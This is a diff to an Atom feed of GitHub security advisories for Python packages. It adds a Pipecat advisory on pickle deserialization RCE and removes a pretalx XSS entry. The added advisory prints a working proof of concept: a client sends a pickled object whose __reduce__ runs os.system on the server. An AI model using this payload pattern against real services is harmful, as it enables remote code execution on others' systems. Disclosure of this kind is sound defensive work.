@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-04-23T21:13:50.598Z</updated>
+    <updated>2026-04-23T22:12:13.001Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,117 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[pipecat-ai] Pipecat: Remote Code Execution by Pickle Deserialization Through LivekitFrameSerializer]]></title>
+        <id>https://github.com/advisories/GHSA-c2jg-5cp7-6wc7</id>
+        <link href="https://github.com/advisories/GHSA-c2jg-5cp7-6wc7"/>
+        <updated>2026-04-23T21:15:43.000Z</updated>
+        <content type="html"><![CDATA[<p>Remote Code Execution via Unsafe Deserialization in Pipecat's LivekitFrameSerializer</p>
+<h3 id="summary">Summary</h3>
+<p>A critical vulnerability exists in Pipecat's <code>LivekitFrameSerializer</code> – an <strong>optional, non-default, undocumented</strong> frame serializer class (now deprecated) intended for LiveKit integration. The class's <code>deserialize()</code> method uses Python's <code>pickle.loads()</code> on data received from WebSocket clients without any validation or sanitization. This means that a malicious WebSocket client can send a crafted pickle payload to execute arbitrary code on the Pipecat server. The vulnerable code resides in <code>src/pipecat/serializers/livekit.py</code> (around line 73), where untrusted WebSocket message data is passed directly into <code>pickle.loads()</code> for deserialization. If a Pipecat server is configured to use LivekitFrameSerializer and is listening on an external interface (e.g. 0.0.0.0), an attacker on the network (or the internet, if the service is exposed) could achieve remote code execution (RCE) on the server by sending a malicious pickle payload.</p>
+<h3 id="details">Details</h3>
+<p>The <code>LivekitFrameSerializer</code> is a serializer meant to convert between Pipecat audio frames and LiveKit's audio frame format. <strong>It is not enabled by default</strong> – developers would have to explicitly use this serializer. In Pipecat version 0.0.90, this class was officially deprecated in favor of a safer <code>LiveKitTransport</code> method, but it remains in the code for backward compatibility. The vulnerability arises in how it handles incoming data: the <code>deserialize()</code> method blindly unpickles whatever byte stream it receives over the WebSocket. Below is a snippet illustrating the core issue in the <code>LivekitFrameSerializer.deserialize</code> implementation:</p>
+<p>Vulnerable code in src/pipecat/serializers/livekit.py:</p>
+<pre><code class="language-python">async def deserialize(self, data: str | bytes) -&gt; Frame | None:
+    # ... (docstring omitted for brevity)
+    audio_frame: AudioFrame = pickle.loads(data)["frame"]   # Unsafely deserializing untrusted data
+    return InputAudioRawFrame(
+        audio=bytes(audio_frame.data),
+        sample_rate=audio_frame.sample_rate,
+        num_channels=audio_frame.num_channels,
+    )
+</code></pre>
+<p>Python's <code>pickle.loads</code> will execute arbitrary code if the input data is a maliciously crafted pickle object. In this case, an attacker can exploit the <code>LivekitFrameSerializer</code> by sending a pickle payload that, when deserialized, runs attacker-controlled code on the server. The serializer assumes the data contains a LiveKit <code>AudioFrame</code> object (possibly in a dictionary with key "frame"), but does not verify the content or source. As a result, any object with a malicious <code>__reduce__</code> or other pickle protocol methods will be executed upon deserialization. This is a known risk: pickle should never be used on untrusted data.</p>
+<p>In summary, whenever <code>LivekitFrameSerializer</code> is active, any client that can connect to the Pipecat WebSocket can send a specially crafted pickle binary. Upon receiving it, Pipecat will call <code>pickle.loads</code>, immediately executing the payload's code. This can lead to a full compromise of the Pipecat server process, allowing attackers to run arbitrary commands or take control of the host system with the privileges of the Pipecat service.</p>
+<h3 id="proof-of-concept-poc">Proof of Concept (PoC)</h3>
+<p>The following proof-of-concept demonstrates how an attacker could exploit this vulnerability. It involves two steps: (1) running a Pipecat WebSocket server using the vulnerable serializer, and (2) sending a malicious pickle from a client.</p>
+<p>Start a Pipecat WebSocket server with the LivekitFrameSerializer enabled – for example, by binding the server to all network interfaces (0.0.0.0) on port 8765. In a Pipecat application, this might be done by specifying the LiveKit serializer in the WebSocket transport parameters. For illustration, the code snippet below starts a server:</p>
+<pre><code class="language-python">import asyncio
+import websockets
+from pipecat.serializers.livekit import LivekitFrameSerializer
+
+serializer = LivekitFrameSerializer()
+
+async def handler(ws):
+    """
+    websockets new-style handler: single argument (connection object).
+    Path (if needed) is available via ws.path.
+    """
+    try:
+        data = await ws.recv()               
+        if isinstance(data, str):
+            data = data.encode("utf-8")     
+        frame = await serializer.deserialize(data)  
+        print("deserialize returned:", frame)
+    except Exception as e:
+        print("deserialize raised:", repr(e))
+
+async def main():
+    print("Starting server on 0.0.0.0:8765 (websockets new API handler)")
+    async with websockets.serve(handler, "0.0.0.0", 8765):
+        await asyncio.Future()  # run forever
+
+if __name__ == "__main__":
+    asyncio.run(main())
+</code></pre>
+<p>In this setup, the server listens on ws://0.0.0.0:8765 (with a default path of /ws for WebSocket connections). It will use <code>LivekitFrameSerializer</code> for incoming frames, making it vulnerable to pickle-based attacks.</p>
+<p>Send a malicious pickle payload from a client – an attacker can now connect to the WebSocket and transmit a crafted pickle object that executes code. For instance, the payload below defines a class RCE whose <code>__reduce__</code> method will invoke <code>os.system("ls -l")</code>. When unpickled on the server, this will run the <code>ls -l</code> command (listing directory contents) on the server side:</p>
+<pre><code class="language-python">import asyncio
+import pickle
+import websockets
+
+class RCE:
+    def __reduce__(self):
+        import os
+        return (os.system, ("echo EXPLOITED &gt; /tmp/pipecat_exploit || true",))
+
+async def attack():
+    uri = "ws://127.0.0.1:8765"   
+    async with websockets.connect(uri) as ws:
+        payload = pickle.dumps({"frame": RCE()})
+        await ws.send(payload)  
+
+if __name__ == "__main__":
+    asyncio.run(attack())
+</code></pre>
+<pre><code>In this PoC, the attacker's code opens a WebSocket connection to the Pipecat server and sends the pickled RCE object. On the server, the `LivekitFrameSerializer.deserialize()` method will call pickle.loads() on this data, which in turn triggers the `RCE.__reduce__` method. This executes the `os.system("ls -l")` command on the server. In a real attack, the payload could be crafted to perform any arbitrary actions (create a reverse shell, modify files, etc.) with the privileges of the Pipecat process.
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>If an application uses <code>LivekitFrameSerializer</code> and exposes the Pipecat WebSocket server to untrusted networks, an attacker can achieve remote code execution on the server with a single malicious message. This could lead to a complete compromise of the server: the attacker can execute operating system commands, read or modify data, install malware, or pivot to other systems. The severity of this vulnerability is high – any code execution vulnerability is critical, especially in a real-time communications server context.</p>
+<p>It's important to note that by default Pipecat does not use LivekitFrameSerializer (and in fact the class is deprecated), so only systems that explicitly opt into this serializer are affected. However, because the class exists in the codebase, users might inadvertently use it. Any such usage on a public-facing or even internal network service can be exploited by an attacker with network access to the service. The worst-case scenario is an internet-exposed Pipecat server using this serializer, which would allow remote exploitation by anyone with access to the WebSocket port.</p>
+<h3 id="mitigation">Mitigation</h3>
+<p>Users of Pipecat should take the following actions to eliminate or reduce the risk of this vulnerability:</p>
+<ol>
+<li><p>Avoid or replace unsafe deserialization: Ideally, do not use <code>LivekitFrameSerializer</code> at all given its use of unsafe pickle deserialization. Pipecat's maintainers have deprecated this class in favor of <code>LiveKitTransport</code>, which does not require explicit pickle usage. If users need to support LiveKit integration or any binary frame serialization, use safer alternatives:</p>
+<pre><code> * Use standardized formats like JSON for simple structured data, or binary formats like Protocol Buffers or MessagePack for more complex data structures. These formats do not execute code upon parsing.
+
+ * If users absolutely must use pickle (not recommended), implement a custom `pickle.Unpickler` with a restricted `find_class()` method. This can limit what classes and functions can be instantiated during unpickling (whitelisting only safe types), which can mitigate arbitrary code execution. However, even a restricted unpickler is risky and should be considered a last resort.
+</code></pre>
+</li>
+<li><p>Improve network security configuration: Limit who can reach the Pipecat service.</p>
+<pre><code> * Bind to localhost whenever possible. If the Pipecat server is intended for internal or single-machine use, use host="127.0.0.1" (or omit the host to default to localhost) instead of 0.0.0.0. This prevents external network access by default and significantly reduces exposure.
+
+ * Require authentication and authorization on the WebSocket connection. If the use case allows, enforce that clients must authenticate (using tokens, API keys, or other means) before accepting and processing frames. This won't fix the underlying code issue, but it can restrict who is able to send potentially malicious data.
+</code></pre>
+</li>
+</ol>
+<p>In summary, the best mitigation is to stop using the vulnerable LivekitFrameSerializer altogether. If users require LiveKit functionality, upgrade to the latest Pipecat version and switch to the recommended <code>LiveKitTransport</code> or another secure method provided by the framework. Additionally, always follow secure coding practices: never trust client-supplied data, and avoid Python pickle (or similar unsafe deserialization) in network-facing components.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/pipecat-ai/pipecat/security/advisories/GHSA-c2jg-5cp7-6wc7">https://github.com/pipecat-ai/pipecat/security/advisories/GHSA-c2jg-5cp7-6wc7</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-62373">https://nvd.nist.gov/vuln/detail/CVE-2025-62373</a></li>
+<li><a href="https://github.com/pipecat-ai/pipecat/releases/tag/v0.0.94">https://github.com/pipecat-ai/pipecat/releases/tag/v0.0.94</a></li>
+<li><a href="https://github.com/advisories/GHSA-c2jg-5cp7-6wc7">https://github.com/advisories/GHSA-c2jg-5cp7-6wc7</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-c2jg-5cp7-6wc7</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-04-23T21:15:42.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[fschat] FastChat has Denial of Service Through Blocking Event Loop in Model Workers (Incomplete Fix for ff66426)]]></title>
         <id>https://github.com/advisories/GHSA-5h65-jx66-j7p5</id>
@@ -1100,37 +1211,5 @@ Symlink target overwritten: /home/user/tmp806nut2g/victim_config.txt
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-03-09T21:31:38.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pretalx] pretalx vulnerable to stored cross-site scripting in organizer search typeahead]]></title>
-        <id>https://github.com/advisories/GHSA-cjcx-jfp2-f7m2</id>
-        <link href="https://github.com/advisories/GHSA-cjcx-jfp2-f7m2"/>
-        <updated>2026-04-18T01:11:39.000Z</updated>
-        <content type="html"><![CDATA[<p>The organiser search in the pretalx backend rendered submission titles, speaker display names, and user names/emails into the result dropdown using <code>innerHTML</code> string interpolation. Any user who controls one of those fields (which includes any registered user whose display name is looked up by an administrator) could include HTML or JavaScript that would execute in an organiser's browser when the organiser's search query matched the malicious record.</p>
-<p>Triggering the vulnerability required:</p>
-<ol>
-<li>An attacker-controlled field reachable by the search, which included any speaker's or submitter's display name in an event context (submitted a proposal) or any user at all for superusers.</li>
-<li>An organiser user with more than just review permissions or administrator user performing a typeahead search whose query matched the malicious record. An attacker can make matches likely by placing common substrings in the payload-bearing field.</li>
-</ol>
-<p>Once triggered, the injected script executed in the context of the pretalx organiser interface and could read the page's CSRF token, submit authenticated requests on the victim's behalf (including requests modifying data due to access to the CSRF token), or exfiltrate data visible to the victim.</p>
-<h3 id="patches">Patches</h3>
-<p>Fixed in pretalx v2026.1.0.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>There is no configuration-level workaround. Operators who cannot upgrade immediately can avoid using the organiser search bar, or apply the patch to <code>src/pretalx/static/orga/js/base.js</code> manually and re-collect static files.</p>
-<h3 id="credits">Credits</h3>
-<p>We thank Elad Meged from Novee Security for finding and reporting this vulnerability.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/pretalx/pretalx/security/advisories/GHSA-cjcx-jfp2-f7m2">https://github.com/pretalx/pretalx/security/advisories/GHSA-cjcx-jfp2-f7m2</a></li>
-<li><a href="https://github.com/advisories/GHSA-cjcx-jfp2-f7m2">https://github.com/advisories/GHSA-cjcx-jfp2-f7m2</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-cjcx-jfp2-f7m2</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-18T01:11:38.000Z</published>
     </entry>
 </feed>
